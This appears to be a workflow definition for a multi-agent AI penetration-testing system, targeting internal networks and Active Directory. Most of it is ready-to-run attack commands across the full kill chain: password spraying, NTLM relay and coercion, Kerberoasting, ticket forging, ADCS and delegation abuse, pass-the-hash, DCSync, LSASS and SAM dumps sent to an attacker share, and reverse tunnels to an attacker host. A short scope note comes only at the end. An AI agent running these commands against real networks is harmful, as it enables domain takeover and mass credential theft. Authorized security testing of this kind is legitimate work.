---
name: W_HUNT_NETWORK
description: Network infrastructure and Active Directory security assessment
trigger: IP range, CIDR, or internal network target detected
agents: [ReconAgent, NetworkServiceAgent, ActiveDirectoryAgent, WindowsAgent, LateralMovementAgent, AuthAgent, RCEAgent, ExploitDevAgent, ValidatorAgent, ExploitChainAgent]
tools: [burp-bridge, credential-vault]
skills_invoked: [NetworkSecurity]
---

# W_HUNT_NETWORK — Network Infrastructure & Active Directory Security Assessment Workflow

> Comprehensive network and infrastructure security assessment covering host discovery, service enumeration, vulnerability scanning, Active Directory exploitation, lateral movement, and privilege escalation. Full kill chain from initial access to domain domination.

---

## Workflow Trigger Conditions

This workflow activates when the hunt orchestrator detects any of:
- CIDR notation (e.g., `10.0.0.0/24`, `192.168.1.0/16`)
- IP range (e.g., `10.0.0.1-254`)
- Single IP or hostname with non-web services
- Target config with `type: network|infrastructure|internal`
- Active Directory domain name (e.g., `corp.target.com`)

---

## Phase 1: NETWORK DISCOVERY

### 1A: Host Discovery

```bash
# ICMP-based host discovery
nmap -sn -PE -PP -PM $CIDR -oA host_discovery_icmp

# ARP discovery (local subnet only)
nmap -sn -PR $CIDR -oA host_discovery_arp

# TCP SYN discovery on common ports (bypasses ICMP-blocking firewalls)
nmap -sn -PS21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 $CIDR -oA host_discovery_syn

# UDP discovery
nmap -sn -PU53,67,68,69,111,123,137,138,161,162,500,514,520,631,1434,1900,4500,49152 $CIDR -oA host_discovery_udp

# Extract live hosts
grep 'Status: Up' host_discovery_syn.gnmap | awk '{print $2}' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n > live_hosts.txt
echo "[*] Discovered $(wc -l < live_hosts.txt) live hosts"

# Fast port scanning with naabu (if available)
naabu -list live_hosts.txt -top-ports 1000 -o naabu_results.txt
```

### 1B: Port Scanning

```bash
# TCP SYN scan — top 1000 ports (fast initial sweep)
nmap -sS -T4 --top-ports 1000 -iL live_hosts.txt -oA tcp_top1000 --open

# Full TCP port scan on interesting hosts
nmap -sS -p- -T4 --min-rate 1000 -iL live_hosts.txt -oA tcp_full --open

# UDP scan — top 200 ports
nmap -sU --top-ports 200 -T4 -iL live_hosts.txt -oA udp_top200 --open

# Extract open ports per host
for host in $(cat live_hosts.txt); do
    ports=$(grep "$host" tcp_full.gnmap | grep -oP '\d+/open' | cut -d/ -f1 | tr '\n' ',')
    echo "$host: $ports" >> host_port_map.txt
done
```

### 1C: Service Enumeration and OS Fingerprinting

```bash
# Service version detection with OS fingerprinting
nmap -sV -sC -O -p$(cat host_port_map.txt | grep "$TARGET_HOST" | cut -d: -f2) $TARGET_HOST -oA service_enum

# Aggressive service detection on all hosts
nmap -sV --version-intensity 5 -A -iL live_hosts.txt -p- -oA full_service_enum --open

# Extract service summary
grep -E 'open.*/' full_service_enum.nmap | sort | uniq -c | sort -rn > service_summary.txt

# Identify high-value targets
grep -E '(domain|kerberos|ldap|msrpc|microsoft-ds|ms-sql|ms-wbt-server)' full_service_enum.nmap > ad_targets.txt
grep -E '(ssh|ftp|telnet|vnc|rdp|winrm)' full_service_enum.nmap > remote_access_targets.txt
grep -E '(http|https|http-proxy)' full_service_enum.nmap > web_targets.txt
```

**Agent handoff:** `ReconAgent` processes `live_hosts.txt` and `service_summary.txt` for target prioritization.

---

## Phase 2: SERVICE ENUMERATION

### 2A: SMB Enumeration (Port 445/139)

```bash
# Enumerate SMB shares and permissions
crackmapexec smb $CIDR --shares
crackmapexec smb $CIDR --shares -u '' -p ''
crackmapexec smb $CIDR --shares -u 'guest' -p ''

# Enumerate users via RID brute-force
crackmapexec smb $TARGET_DC -u '' -p '' --rid-brute 10000

# Enum4linux-ng comprehensive enumeration
enum4linux-ng -A $TARGET_DC -oA enum4linux_output

# SMB version and signing check
crackmapexec smb $CIDR --gen-relay-list relay_targets.txt
nmap -p445 --script smb-security-mode $CIDR -oN smb_signing.txt

# Check for null sessions
smbclient -L \\\\$TARGET_DC -N
rpcclient -U "" -N $TARGET_DC -c "enumdomusers;enumdomgroups;querydominfo"

# Enumerate accessible shares content
smbmap -H $TARGET_DC -u '' -p '' -R --depth 3

# Check for EternalBlue (MS17-010)
nmap -p445 --script smb-vuln-ms17-010 $CIDR -oN eternalblue_check.txt
```

### 2B: LDAP Enumeration (Port 389/636)

```bash
# Anonymous LDAP bind
ldapsearch -x -H ldap://$TARGET_DC -b "DC=corp,DC=target,DC=com" -s base namingContexts

# Dump domain users
ldapsearch -x -H ldap://$TARGET_DC -b "DC=corp,DC=target,DC=com" "(objectClass=user)" cn sAMAccountName memberOf userAccountControl

# ldapdomaindump for structured output
ldapdomaindump $TARGET_DC -u 'DOMAIN\user' -p 'password' -o ldap_dump/

# Enumerate with windapsearch
windapsearch -d $DOMAIN -dc $TARGET_DC --da --users --groups --computers --unconstrained --gpos -o windapsearch_output/
```

### 2C: DNS Enumeration (Port 53)

```bash
# Zone transfer attempt
dig axfr @$TARGET_DC $DOMAIN
host -t axfr $DOMAIN $TARGET_DC

# DNS enumeration
nmap -p53 --script dns-brute $TARGET_DC --script-args dns-brute.domain=$DOMAIN

# Reverse DNS sweep
nmap -sn -R $CIDR | grep 'rDNS' > reverse_dns.txt

# ADIDNS enumeration
adidnsdump -u "$DOMAIN\\user" -p 'password' $TARGET_DC -r
```

### 2D: RDP Enumeration (Port 3389)

```bash
# Check RDP availability and NLA
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info $CIDR -oN rdp_enum.txt

# Check for BlueKeep (CVE-2019-0708)
nmap -p3389 --script rdp-vuln-ms12-020 $CIDR -oN bluekeep_check.txt

# RDP screenshot (if rdp-sec-check available)
rdp-sec-check $TARGET_HOST
```

### 2E: Additional Service Enumeration

```bash
# SSH enumeration
nmap -p22 --script ssh-auth-methods,ssh2-enum-algos $CIDR -oN ssh_enum.txt

# FTP enumeration
nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst $CIDR -oN ftp_enum.txt

# SNMP community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $CIDR
snmpwalk -v2c -c public $TARGET_HOST

# MSSQL enumeration
nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $CIDR -oN mssql_enum.txt
crackmapexec mssql $CIDR -u '' -p ''

# MySQL enumeration
nmap -p3306 --script mysql-info,mysql-enum,mysql-empty-password $CIDR -oN mysql_enum.txt

# PostgreSQL enumeration
nmap -p5432 --script pgsql-brute $CIDR -oN pgsql_enum.txt

# NFS enumeration
showmount -e $TARGET_HOST
nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs $CIDR -oN nfs_enum.txt

# WinRM check
crackmapexec winrm $CIDR -u '' -p ''
nmap -p5985,5986 --script http-auth $CIDR -oN winrm_enum.txt

# Kerberos user enumeration
kerbrute userenum -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $TARGET_DC
```

---

## Phase 3: VULNERABILITY SCANNING

### 3A: Nmap Vulnerability Scripts

```bash
# Run all vuln category scripts
nmap -sV --script vuln -iL live_hosts.txt -oA nmap_vuln_scan

# Specific high-impact checks
nmap --script smb-vuln-*,rdp-vuln-*,ssl-heartbleed,http-shellshock,http-vuln-cve* \
  -iL live_hosts.txt -oA specific_vuln_scan

# SSL/TLS analysis
nmap -p443,8443,636,993,995 --script ssl-enum-ciphers,ssl-cert,ssl-known-key \
  -iL live_hosts.txt -oA ssl_analysis
```

### 3B: Nuclei Network Templates

```bash
# Run nuclei with network templates
nuclei -l live_hosts.txt -t network/ -o nuclei_network_results.txt -severity critical,high,medium

# Run nuclei with CVE templates for discovered services
nuclei -l live_hosts.txt -t cves/ -o nuclei_cve_results.txt -severity critical,high

# Custom nuclei scan for specific services
nuclei -l web_targets.txt -t http/ -o nuclei_http_results.txt -severity critical,high
```

### 3C: Exploit Correlation

```bash
# Search for exploits matching discovered service versions
for service in $(grep -oP '\d+/tcp.*' full_service_enum.nmap | awk '{print $3,$4,$5}' | sort -u); do
    echo "=== $service ==="
    searchsploit "$service" --exclude="dos" | head -10
done > searchsploit_results.txt

# Check for known CVEs
grep -oP 'CVE-\d{4}-\d+' nmap_vuln_scan.nmap nuclei_*_results.txt 2>/dev/null | sort -u > discovered_cves.txt
```

**Agent handoff:** `RCEAgent` and `ExploitDevAgent` receive vulnerability data for exploitation validation.

---

## Phase 4: CREDENTIAL ATTACKS

### 4A: Default Credential Testing

```bash
# Test default credentials across services
crackmapexec smb $CIDR -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -p /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt --no-bruteforce

crackmapexec ssh $CIDR -u admin -p admin
crackmapexec mssql $CIDR -u sa -p '' -q "SELECT @@version"
crackmapexec winrm $CIDR -u administrator -p 'Password1'

# Test web-based default credentials on management interfaces
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  $TARGET_HOST http-get /admin/
```

### 4B: Password Spraying

```bash
# Collect usernames from prior enumeration
cat ldap_dump/domain_users.grep | awk '{print $1}' > domain_users.txt
cat enum4linux_output.json | jq -r '.users[].username' >> domain_users.txt
sort -u domain_users.txt -o domain_users.txt

# Spray common passwords (respect lockout policy!)
# First check lockout policy
crackmapexec smb $TARGET_DC -u 'user' -p 'pass' --pass-pol

# Spray with single password (one attempt per lockout window)
crackmapexec smb $TARGET_DC -u domain_users.txt -p 'Spring2024!' --continue-on-success
crackmapexec smb $TARGET_DC -u domain_users.txt -p 'Welcome1!' --continue-on-success
crackmapexec smb $TARGET_DC -u domain_users.txt -p 'Company2024!' --continue-on-success

# Kerbrute spray (faster, less detectable)
kerbrute passwordspray -d $DOMAIN --dc $TARGET_DC domain_users.txt 'Spring2024!'
```

### 4C: Hash Capture

```bash
# Start Responder for NTLM hash capture
sudo responder -I eth0 -wrd -P -v

# Inveigh (Windows alternative)
# Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -FileOutput Y

# NTLM relay with impacket
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

# Coerce authentication via PetitPotam
python3 PetitPotam.py -d $DOMAIN -u '' -p '' $LISTENER_IP $TARGET_DC

# Coerce via PrinterBug
python3 dementor.py -d $DOMAIN -u user -p 'password' $LISTENER_IP $TARGET_DC
```

### 4D: Brute Force (Targeted)

```bash
# SSH brute force on specific targets
hydra -L domain_users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  $TARGET_HOST ssh -t 4 -f

# RDP brute force
hydra -L domain_users.txt -P passwords.txt $TARGET_HOST rdp -t 1 -w 5

# MSSQL brute force
hydra -L domain_users.txt -P passwords.txt $TARGET_HOST mssql -t 4

# Crack captured NTLM hashes
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=netntlmv2 captured_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Agent handoff:** `AuthAgent` for credential validation and access mapping.

---

## Phase 5: ACTIVE DIRECTORY EXPLOITATION

### 5A: BloodHound Collection and Analysis

```bash
# SharpHound collection (from Windows)
# SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp\ --zipfilename bh_collection.zip

# bloodhound-python (from Linux)
bloodhound-python -u 'user' -p 'password' -d $DOMAIN -ns $TARGET_DC -c All --zip

# Upload to BloodHound
# Import zip file via BloodHound GUI or API

# Key BloodHound queries:
# - Shortest path to Domain Admin
# - Kerberoastable users with admin rights
# - Users with DCSync rights
# - Computers with unconstrained delegation
# - Paths from owned principals
# - AS-REP roastable users
```

### 5B: Kerberos Attacks

```bash
# Kerberoasting — request TGS tickets for service accounts
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $TARGET_DC -request -outputfile kerberoast_hashes.txt

# Crack Kerberoast hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AS-REP Roasting — target users without pre-auth
impacket-GetNPUsers $DOMAIN/ -usersfile domain_users.txt -dc-ip $TARGET_DC -no-pass -outputfile asrep_hashes.txt

# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Request TGT with valid credentials
impacket-getTGT $DOMAIN/user:password -dc-ip $TARGET_DC

# Silver Ticket (requires service hash)
impacket-ticketer -nthash $SERVICE_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn $SPN administrator
export KRB5CCNAME=administrator.ccache

# Golden Ticket (requires krbtgt hash — post-DCSync)
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN administrator
```

### 5C: ADCS Abuse (Active Directory Certificate Services)

```bash
# Enumerate ADCS with Certipy
certipy find -u 'user@domain.com' -p 'password' -dc-ip $TARGET_DC -vulnerable -stdout

# ESC1 — Misconfigured certificate templates (enrollee can specify SAN)
certipy req -u 'user@domain.com' -p 'password' -target $CA_HOST -ca $CA_NAME \
  -template VulnerableTemplate -upn administrator@$DOMAIN

# ESC4 — Vulnerable certificate template ACL
certipy template -u 'user@domain.com' -p 'password' -template VulnerableTemplate \
  -save-old -target $TARGET_DC

# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
certipy req -u 'user@domain.com' -p 'password' -target $CA_HOST -ca $CA_NAME \
  -template User -upn administrator@$DOMAIN

# ESC8 — NTLM relay to ADCS HTTP enrollment
certipy relay -target "http://$CA_HOST/certsrv/certfnsh.asp" -ca $CA_NAME

# Authenticate with obtained certificate
certipy auth -pfx administrator.pfx -dc-ip $TARGET_DC
```

### 5D: Delegation Attacks

```bash
# Find unconstrained delegation computers
impacket-findDelegation $DOMAIN/user:password -dc-ip $TARGET_DC

# Constrained delegation abuse
impacket-getST -spn "cifs/$TARGET_HOST" -impersonate administrator \
  $DOMAIN/svc_account:password -dc-ip $TARGET_DC

# Resource-Based Constrained Delegation (RBCD)
# Add computer account
impacket-addcomputer $DOMAIN/user:password -computer-name 'EVIL$' -computer-pass 'P@ssw0rd' -dc-ip $TARGET_DC

# Set msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd $DOMAIN/user:password -delegate-from 'EVIL$' -delegate-to $TARGET_COMPUTER -dc-ip $TARGET_DC -action write

# Request ticket via S4U
impacket-getST -spn "cifs/$TARGET_COMPUTER.$DOMAIN" -impersonate administrator \
  $DOMAIN/'EVIL$':'P@ssw0rd' -dc-ip $TARGET_DC
```

### 5E: GPO Abuse

```bash
# Enumerate GPOs and permissions
crackmapexec smb $TARGET_DC -u user -p password -M gpp_password
crackmapexec smb $TARGET_DC -u user -p password -M gpp_autologin

# Check for GPO write permissions (via BloodHound or manual)
# If writable GPO linked to high-value OU:

# SharpGPOAbuse (from Windows)
# SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "Vulnerable GPO"
# SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net localgroup administrators user /add" --GPOName "Vulnerable GPO"

# pyGPOAbuse (from Linux)
pygpoabuse $DOMAIN/user:password -gpo-id $GPO_GUID -command "net localgroup administrators evil_user /add" -dc-ip $TARGET_DC
```

**Agent handoff:** `WindowsAgent` for AD-specific attack chains. `AuthAgent` for credential validation.

---

## Phase 6: LATERAL MOVEMENT

### 6A: Pass-the-Hash

```bash
# SMB execution with NTLM hash
impacket-psexec $DOMAIN/administrator@$TARGET_HOST -hashes :$NTLM_HASH
impacket-wmiexec $DOMAIN/administrator@$TARGET_HOST -hashes :$NTLM_HASH
impacket-smbexec $DOMAIN/administrator@$TARGET_HOST -hashes :$NTLM_HASH
impacket-atexec $DOMAIN/administrator@$TARGET_HOST -hashes :$NTLM_HASH "whoami"

# CrackMapExec for mass PtH
crackmapexec smb $CIDR -u administrator -H $NTLM_HASH --local-auth -x "whoami"
crackmapexec smb $CIDR -u administrator -H $NTLM_HASH -x "whoami"
```

### 6B: Pass-the-Ticket / Overpass-the-Hash

```bash
# Overpass-the-Hash (request TGT with NTLM hash)
impacket-getTGT $DOMAIN/administrator -hashes :$NTLM_HASH -dc-ip $TARGET_DC
export KRB5CCNAME=administrator.ccache

# Use Kerberos ticket for lateral movement
impacket-psexec $DOMAIN/administrator@$TARGET_HOST -k -no-pass
impacket-wmiexec $DOMAIN/administrator@$TARGET_HOST -k -no-pass
impacket-smbexec $DOMAIN/administrator@$TARGET_HOST -k -no-pass

# Pass-the-Ticket with Rubeus (Windows)
# Rubeus.exe ptt /ticket:ticket.kirbi
# Rubeus.exe asktgt /user:administrator /rc4:$NTLM_HASH /ptt
```

### 6C: DCOM / WMI / WinRM Execution

```bash
# DCOM execution
impacket-dcomexec $DOMAIN/administrator:password@$TARGET_HOST "whoami" -object MMC20

# WMI execution
impacket-wmiexec $DOMAIN/administrator:password@$TARGET_HOST "whoami"
crackmapexec smb $TARGET_HOST -u administrator -p password -x "whoami" --exec-method wmiexec

# WinRM execution
evil-winrm -i $TARGET_HOST -u administrator -p password
evil-winrm -i $TARGET_HOST -u administrator -H $NTLM_HASH
crackmapexec winrm $TARGET_HOST -u administrator -p password -x "whoami"

# PSRemoting via PowerShell
# Enter-PSSession -ComputerName $TARGET_HOST -Credential $cred
# Invoke-Command -ComputerName $TARGET_HOST -ScriptBlock { whoami } -Credential $cred
```

### 6D: SMB Relay

```bash
# Identify targets without SMB signing
crackmapexec smb $CIDR --gen-relay-list smb_relay_targets.txt

# Set up NTLM relay
impacket-ntlmrelayx -tf smb_relay_targets.txt -smb2support -i

# Relay to LDAP for delegation abuse
impacket-ntlmrelayx -t ldaps://$TARGET_DC --delegate-access --escalate-user user

# Relay to ADCS for certificate enrollment
impacket-ntlmrelayx -t "http://$CA_HOST/certsrv/certfnsh.asp" --adcs --template DomainController
```

### 6E: Network Pivoting

```bash
# Chisel reverse tunnel
# On attacker: 
chisel server --reverse --port 8888

# On compromised host:
chisel client $ATTACKER_IP:8888 R:socks

# Ligolo-ng (modern alternative)
# On attacker:
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On compromised host:
ligolo-agent -connect $ATTACKER_IP:11601 -retry -ignore-cert

# SSH dynamic port forwarding
ssh -D 9050 -N -f user@$PIVOT_HOST

# Proxychains configuration for pivoted tools
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains crackmapexec smb $INTERNAL_CIDR
```

---

## Phase 7: PRIVILEGE ESCALATION

### 7A: Windows Privilege Escalation

```bash
# WinPEAS automated enumeration
# Upload and run on target:
# winPEASx64.exe > winpeas_output.txt

# Key manual checks via CrackMapExec
crackmapexec smb $TARGET_HOST -u user -p password -M spider_plus
crackmapexec smb $TARGET_HOST -u user -p password -x "whoami /priv"
crackmapexec smb $TARGET_HOST -u user -p password -x "net localgroup administrators"

# Check for unquoted service paths
crackmapexec smb $TARGET_HOST -u user -p password -x "wmic service get name,displayname,pathname,startmode | findstr /i /v C:\Windows\\ | findstr /i /v \"\""

# Check for modifiable services
crackmapexec smb $TARGET_HOST -u user -p password -x "sc query state= all"

# Check for AlwaysInstallElevated
crackmapexec smb $TARGET_HOST -u user -p password -x "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"
crackmapexec smb $TARGET_HOST -u user -p password -x "reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"

# Check for stored credentials
crackmapexec smb $TARGET_HOST -u user -p password -x "cmdkey /list"

# SeImpersonatePrivilege exploitation (PrintSpoofer/GodPotato)
# PrintSpoofer.exe -i -c "cmd /c whoami"
# GodPotato.exe -cmd "cmd /c whoami"

# DLL Hijacking — find writable DLL search order directories
# Process Monitor filter: Result is NAME NOT FOUND, Path contains .dll
```

### 7B: Linux Privilege Escalation

```bash
# LinPEAS automated enumeration
# curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Key manual checks
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Sudo permissions
sudo -l

# Writable /etc/passwd
ls -la /etc/passwd /etc/shadow

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l

# Running processes
ps aux | grep root

# Kernel version for exploit matching
uname -a
cat /etc/os-release

# Searchsploit for kernel exploits
searchsploit "linux kernel $(uname -r | cut -d- -f1)" --exclude="dos"

# Docker privilege escalation (if in docker group)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# NFS root squashing check
cat /etc/exports
showmount -e localhost
```

---

## Phase 8: POST-EXPLOITATION

### 8A: Domain Compromise — DCSync

```bash
# DCSync attack (requires Replicating Directory Changes rights)
impacket-secretsdump $DOMAIN/administrator@$TARGET_DC -just-dc-ntlm
impacket-secretsdump $DOMAIN/administrator@$TARGET_DC -just-dc-user krbtgt

# DCSync with hash
impacket-secretsdump $DOMAIN/administrator@$TARGET_DC -hashes :$NTLM_HASH -just-dc-ntlm

# Mimikatz DCSync (from Windows)
# lsadump::dcsync /domain:$DOMAIN /user:krbtgt
# lsadump::dcsync /domain:$DOMAIN /all /csv
```

### 8B: Credential Harvesting

```bash
# LSASS dump via CrackMapExec
crackmapexec smb $TARGET_HOST -u administrator -H $NTLM_HASH --lsa
crackmapexec smb $TARGET_HOST -u administrator -H $NTLM_HASH --sam
crackmapexec smb $TARGET_HOST -u administrator -H $NTLM_HASH --ntds

# LSASS dump with impacket
impacket-secretsdump administrator@$TARGET_HOST -hashes :$NTLM_HASH

# Remote LSASS dump via Procdump (less detected)
# procdump.exe -accepteula -ma lsass.exe lsass.dmp
# pypykatz lsa minidump lsass.dmp

# SAM/SYSTEM/SECURITY hive extraction
impacket-reg $DOMAIN/administrator@$TARGET_HOST -hashes :$NTLM_HASH save -keyName 'HKLM\SAM' -o '\\$ATTACKER_IP\share\SAM'
impacket-reg $DOMAIN/administrator@$TARGET_HOST -hashes :$NTLM_HASH save -keyName 'HKLM\SYSTEM' -o '\\$ATTACKER_IP\share\SYSTEM'
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# DPAPI credential extraction
# SharpDPAPI.exe triage /server:$TARGET_HOST
impacket-dpapi backupkey $DOMAIN/administrator@$TARGET_DC -hashes :$NTLM_HASH

# Mimikatz comprehensive dump (from Windows)
# privilege::debug
# sekurlsa::logonpasswords
# sekurlsa::wdigest
# sekurlsa::ekeys
# lsadump::sam
# vault::cred
```

### 8C: Persistence Verification (For Reporting)

```bash
# Document persistence vectors (DO NOT deploy — report only)

# Golden Ticket parameters
echo "krbtgt NTLM hash: $KRBTGT_HASH" >> persistence_vectors.txt
echo "Domain SID: $DOMAIN_SID" >> persistence_vectors.txt

# Skeleton Key possibility
echo "Skeleton Key injectable on: $TARGET_DC" >> persistence_vectors.txt

# AdminSDHolder abuse path documented
echo "AdminSDHolder modification possible via: $ATTACK_PATH" >> persistence_vectors.txt

# SID History injection path
echo "SID History injectable for: $USER" >> persistence_vectors.txt

# ADCS Golden Certificate
echo "CA compromise possible via: $ATTACK_CHAIN" >> persistence_vectors.txt
```

### 8D: Data Discovery

```bash
# Search for sensitive files on compromised hosts
crackmapexec smb $CIDR -u administrator -H $NTLM_HASH -M spider_plus --share 'C$' -o pattern="*.kdbx,*.config,*.conf,*.ini,*.txt,*.xml,*.json,*.ps1,*.bat,*.cmd,*.vbs"

# Search for credentials in files
crackmapexec smb $TARGET_HOST -u administrator -H $NTLM_HASH -x "findstr /si password *.txt *.ini *.config *.xml *.json" --exec-method wmiexec

# Check for password managers
crackmapexec smb $TARGET_HOST -u administrator -H $NTLM_HASH -x "dir /s /b C:\Users\*.kdbx C:\Users\*.lastpass C:\Users\*.1pif 2>nul"

# Group Policy Preferences passwords
crackmapexec smb $TARGET_DC -u user -p password -M gpp_password
impacket-Get-GPPPassword $DOMAIN/user:password@$TARGET_DC
```

---

## Phase 9: REPORTING

### 9A: Evidence Consolidation

```bash
# Organize all evidence
mkdir -p report/{scans,credentials,screenshots,attack_chains,tools_output}

# Consolidate scan results
cp *_enum.txt *_scan.* report/scans/
cp *.gnmap *.xml report/scans/

# Consolidate credential evidence (hashed/redacted for report)
cp kerberoast_hashes.txt asrep_hashes.txt report/credentials/
cp persistence_vectors.txt report/attack_chains/

# Consolidate BloodHound data
cp *.zip report/tools_output/

# Generate attack chain timeline
cat << 'EOF' > report/attack_chains/kill_chain.md
## Attack Chain Summary
1. Initial Access: [method]
2. Credential Obtained: [user] via [technique]
3. Lateral Movement: [source] -> [target] via [technique]
4. Privilege Escalation: [low-priv] -> [high-priv] via [technique]
5. Domain Compromise: [DA/EA obtained] via [technique]
EOF
```

### 9B: Finding Classification

Findings are classified by attack chain stage:
- **INITIAL ACCESS** — Default creds, password spray, public exploits
- **CREDENTIAL ACCESS** — Kerberoasting, AS-REP, NTLM relay, hash capture
- **LATERAL MOVEMENT** — PtH, PtT, DCOM, WMI, relay attacks
- **PRIVILEGE ESCALATION** — Local privesc, delegation abuse, ADCS
- **DOMAIN COMPROMISE** — DCSync, Golden Ticket, ADCS golden cert
- **PERSISTENCE VECTORS** — Skeleton Key, AdminSDHolder, SID History (documented, not deployed)

### 9C: Report Generation

Each finding includes:
1. Attack chain stage and MITRE ATT&CK technique ID
2. Severity (Critical / High / Medium / Low / Informational)
3. Affected hosts/accounts with scope of impact
4. Step-by-step reproduction with exact commands
5. Evidence (screenshots, tool output, hashes — redacted appropriately)
6. Business impact: what an attacker could achieve
7. Remediation guidance with priority ordering
8. CVSS 3.1 vector string

**Report output:** Written to `~/.claude/MEMORY/BugBounty/Sessions/{target-slug}/reports/network_assessment_report.md`

---

## Agent Coordination Matrix

| Phase | Primary Agent | Supporting Agents | Data Flow |
|-------|--------------|-------------------|-----------|
| Network Discovery | ReconAgent | — | live_hosts.txt, service_summary.txt |
| Service Enumeration | ReconAgent | WindowsAgent | Enumeration output per service |
| Vulnerability Scanning | ReconAgent | RCEAgent, ExploitDevAgent | CVE list, exploit candidates |
| Credential Attacks | AuthAgent | WindowsAgent | Captured creds/hashes |
| Active Directory | WindowsAgent | AuthAgent, ExploitDevAgent | BloodHound data, attack paths |
| Lateral Movement | WindowsAgent | RCEAgent | Compromised hosts list |
| Privilege Escalation | WindowsAgent | ExploitDevAgent | Escalation paths |
| Post-Exploitation | WindowsAgent | AuthAgent | Domain credentials |
| Reporting | ReconAgent | All agents | Consolidated findings |

---

## Severity Escalation Triggers

The following findings automatically escalate to **Critical** and trigger immediate notification:

- Domain Admin or Enterprise Admin credentials obtained
- DCSync successful (krbtgt hash extracted)
- Unauthenticated remote code execution on any host
- ADCS misconfiguration allowing domain escalation (ESC1-ESC8)
- SMB relay leading to privileged code execution
- Unconstrained delegation on a compromisable host
- Default credentials on domain controllers or critical infrastructure
- Cleartext credentials in Group Policy Preferences
- MS17-010 (EternalBlue) or similar wormable vulnerabilities confirmed
- Skeleton Key injectable domain controllers

---

## Operational Security Notes

- **Password spraying:** Always check lockout policy first. One password per lockout window. Log all attempts.
- **Exploitation:** Prefer non-destructive techniques. Avoid kernel exploits on production systems unless explicitly authorized.
- **Persistence:** Document vectors for the report. Never deploy actual persistence mechanisms unless scope explicitly permits.
- **Data handling:** All extracted credentials/hashes stored encrypted. Purge after engagement per rules of engagement.
- **Scope awareness:** Verify every target IP is in scope before exploitation. Lateral movement must stay within authorized boundaries.
